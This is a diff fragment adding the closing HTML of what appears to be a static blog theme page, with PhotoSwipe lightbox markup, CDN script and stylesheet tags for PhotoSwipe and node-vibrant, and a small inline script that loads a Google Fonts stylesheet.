+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
